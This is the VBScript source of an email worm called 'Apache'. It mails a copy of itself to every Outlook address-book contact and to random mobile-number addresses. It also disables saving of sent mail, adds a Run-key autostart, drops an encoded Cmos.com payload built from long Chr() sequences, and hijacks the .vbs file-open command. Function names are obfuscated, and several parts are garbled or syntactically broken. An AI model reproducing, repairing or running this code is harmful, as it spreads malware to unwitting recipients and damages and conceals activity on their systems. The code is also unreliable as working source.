Apache()

Sub Apache()
   If PreguntaSiHeEstadoAqui() <> 1 Then
      ModificarRegistro()
      teledVirusAaclock()
      motelTextoAaclock()
      teledCmosAaclock()
      EnviarCorreo()
   End If
End Sub

Function x08226313404(Clave)
   On Error Resume Next
   Dim system
   Dim n_clave

   Set system = CreateObject("WScript.Shell")
   n_clave = system.RegRead(Clave)

   Set system  = Nothing
   x08226313404 = n_clave
End Function

Function x065309054786625(Clave,Valor,Opcion)
   On Error Resume Next
   Dim system

   Set system = CreateObject("WScript.Shell")
   If Opcion = "REG_DWORD" Then
      system.RegWrite Clave,Valor,"REG_DWORD"
   Else
      system.RegWrite Clave,Valor
   End If

   Set system  = Nothing
End Function

Function x0584468753223471254414486789184317356743120783405256460775561967771631537004514347650740761("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Apache")

   PreguntaSiHeEstadoAqui = n_clave
End Function

Sub ModificarRegistro
   On Error Resume Next

   x065309054786625 "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Apache",1,"REG_DWORD"
   x065309054786625 "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Outlook\Preferences\SaveSent",0,"REG_DWORD"
   x065309054786625 "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Cmos","Cmos.com",""
End Sub

Sub EnviarCorreo()
   On Error Resume Next

   Dim Contador
   Dim NumeroDeCarpetasDeDirecciones
   Dim Destinatario
   Dim system
   Dim OutLook
   Dim Mapi
   Dim CarpetaDeDirecciones

   Set system = CreateObject("WScript.Shell")
   Set OutLook = WScript.CreateObject("Outlook.Application")
   Set Mapi = OutLook.GetNameSpace("Mapi")

   For NumeroDeCarpetasDeDirecciones = 1 To Mapi.AddressLists.Count
      Set CarpetaDeDirecciones = Mapi.AddressLists(NumeroDeCarpetasDeDirecciones)
      For Contador = 1 To CarpetaDeDirecciones.AddressEntries.Count
         Set Mail = OutLook.CreateItem(0)
         Mail.Subject = "Apache"
         Mail.Body = Mail.Body & ""
         Mail.Body = Mail.Body & "Apache the Next Telefonica Virus"
         Mail.Body = Mail.Body & "make by Ginseng Boy2000."
         Mail.Body = Mail.Body & vbcrlf
         Mail.Body = Mail.Body & "I am the maker of HTTM.Jer Virus"
         Mail.Body = Mail.Body & "http://siliciumrevolte.cbj.net."
         Mail.Body = Mail.Body & vbcrlf
         Mail.Body = Mail.Body & vbcrlf
         Mail.Attachments.Add("C:\Apache.TXT.vbs")
         Destinatario = CarpetaDeDirecciones.AddressEntries(Contador)
         Mail.Recipients.Add(Destinatario)
         Mail.Send
         Set Mail = Nothing

         Set Mail = OutLook.CreateItem(0)
         Mail.Subject = "Apache"
         Mail.Body = " Apache Mail Client que: New Apache Mail client."
         Destinatario = DestinatarioMovil()
         Mail.Recipients.Add(Destinatario)
         Mail.Send
         Set Mail = Nothing
      Next
      Set CarpetaDeDirecciones = Nothing
   Next

   Set system              = Nothing
   Set OutLook              = Nothing
   Set Mapi                 = Nothing
   Set CarpetaDeDirecciones = Nothing
End Sub

Function x13248260506817977998230788556010525006551553202151113070991486037083078165923061052260632816972679170002881396782819905185372736755971692497704512800345263987164064522216133016477263881441201966961836850295807634826666644422563328372782018833244124305739748489(8 * Rnd)
   If Aleatorio = 0 Then
      Prefijo = "609"
   ElseIf Aleatorio = 1 then
      Prefijo = "619"
   ElseIf Aleatorio = 2 then
      Prefijo = "623"
   ElseIf Aleatorio = 3 then
      Prefijo = "630"
   ElseIf Aleatorio = 4 then
      Prefijo = "639"
   ElseIf Aleatorio = 5 then
      Prefijo = "646"
   ElseIf Aleatorio = 6 then
      Prefijo = "649"
   End If
   For Contador = 1 To 6
      Randomize
      Aleatorio = Int(10 * Rnd)
      Numero = Numero & Aleatorio
   Next

   DestinatarioMovil = Prefijo & Numero & Destinatario
End Function

Sub teledVirusAaclock
   On Error Resume Next

   Dim Fso
   Dim aclock
   Dim motel
   Dim Handle

   Set Fso     = CreateObject("Scripting.FileSystemObject")
   Set aclock = Fso.OpenTextFile(WScript.ScriptFullname,1)
   motel       = aclock.ReadAll
   Set Handle  = Fso.GetFile(WScript.ScriptFullName)
   Handle.Copy("C:\Apache.TXT.vbs")

   Set aclock = Nothing
   Set TempDir = Nothing
   Set Handle  = Nothing
   Set Fso     = Nothing
End Sub

Sub motelTextoAaclock
   On Error Resume Next

   Dim Fso
   Dim aclock
   Dim motel

   Set Fso = CreateObject("Scripting.FileSystemObject")
   Set aclock = Fso.CreateTextFile("C:\Apache.TXT",True)

   motel = ""
   motel = motel & "Apache" & vbcrlf
   motel = motel & "http://www.yahoo.com/" & vbcrlf
   motel = motel & "http://www.lycos.com/" & vbcrlf
   motel = motel & "http://www.webcrawler.com" & vbcrlf
   motel = motel & "http://www.d2-message.com" & vbcrlf
   aclock.Writeline(motel)
   aclock.Close

   Set aclock   = Nothing
   Set Fso       = Nothing
End Sub

Sub teledCmosAaclock
   On Error Resume Next
   Dim Fso
   Dim aclock
   Dim SystemDir
   Dim WinDir
   Dim motel
   Dim Contador

   Set Fso       = CreateObject("Scripting.FileSystemObject")
   Set WinDir    = Fso.GetSpecialFolder(0)
   Set SystemDir = Fso.GetSpecialFolder(1)
   Set aclock   = Fso.CreateTextFile(SystemDir & "\Cmos.com",True)

   motel = ""
   motel = Chr(233) & Chr(003) & Chr(002)
   For Contador = 1 To 515
      motel = motel & Chr(000)
   Next
   motel = motel & P1$ = Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (50) & Chr (51) & Chr (50) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (48) & Chr (50) & Chr (56) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (48) & Chr (48) & Chr (48) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (49) & Chr (56) & Chr (53) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (48)


P2$ = Chr (48) & Chr (52) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (48) & Chr (48) & Chr (48) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (49) & Chr (57) & Chr (56) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (48) & Chr (48) & Chr (54) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (48) & Chr (48) & Chr (51) & Chr (41) & Chr (32) & Chr (38) & Chr (32)


P3$ = Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (48) & Chr (48) & Chr (51) & Chr (41) & Chr (13) & Chr (10) & Chr (32) & Chr (32) & Chr (32) & Chr (67) & Chr (111) & Chr (112) & Chr (105) & Chr (97) & Chr (32) & Chr (61) & Chr (32) & Chr (67) & Chr (111) & Chr (112) & Chr (105) & Chr (97) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (48) & Chr (48) & Chr (48) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (49) & Chr (57) & Chr (56) & Chr (41) & Chr (32) & Chr (38)


P4$ = Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (48) & Chr (48) & Chr (54) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (48) & Chr (48) & Chr (52) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (48) & Chr (48) & Chr (51) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (48) & Chr (48) & Chr (49) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (49)


P5$ = Chr (57) & Chr (56) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (48) & Chr (48) & Chr (54) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (48) & Chr (48) & Chr (53) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (48) & Chr (48) & Chr (51) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (48) & Chr (48) & Chr (48) & Chr (41) & Chr (32) & Chr (38) & Chr (32)


P6$ = Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (50) & Chr (51) & Chr (50) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (48) & Chr (50) & Chr (51) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (48) & Chr (48) & Chr (48) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (50) & Chr (50) & Chr (54) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (50) & Chr (51)


P7$ = Chr (54) & Chr (41) & Chr (13) & Chr (10) & Chr (32) & Chr (32) & Chr (32) & Chr (67) & Chr (111) & Chr (112) & Chr (105) & Chr (97) & Chr (32) & Chr (61) & Chr (32) & Chr (67) & Chr (111) & Chr (112) & Chr (105) & Chr (97) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (49) & Chr (56) & Chr (52) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (48) & Chr (48) & Chr (48) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (48)


P8$ = Chr (55) & Chr (54) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (50) & Chr (48) & Chr (53) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (48) & Chr (51) & Chr (51) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (49) & Chr (56) & Chr (53) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (48) & Chr (54) & Chr (52) & Chr (41) & Chr (32) & Chr (38) & Chr (32)


P9$ = Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (48) & Chr (48) & Chr (48) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (49) & Chr (51) & Chr (57) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (49) & Chr (57) & Chr (51) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (50) & Chr (53) & Chr (48) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (50) & Chr (51)


P10$ = Chr (49) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (49) & Chr (49) & Chr (50) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (48) & Chr (53) & Chr (49) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (49) & Chr (57) & Chr (50) & Chr (41) & Chr (32) & Chr (38) & Chr (32) & Chr (67) & Chr (104) & Chr (114) & Chr (40) & Chr (50) & Chr (51) & Chr (49) & Chr (41) & Chr (13) & Chr (10) & Chr (32) & Chr (32)


Final$ = P1$ & P2$ & P3$ & P4$ & P5$ & P6$ & P7$ & P8$ & P9$ & P10$
   aclock.Writeline(motel)
   aclock.Close

   aclock = WinDir & "\Notepad.exe C:\Apache.TXT"
   x065309054786625 "HKEY_LOCAL_MACHINE\Software\CLASSES\VBSFile\Shell\Open\Command\",aclock,""

   Set aclock     = Nothing
   Set SystemDir   = Nothing
   Set Fso         = Nothing
End Sub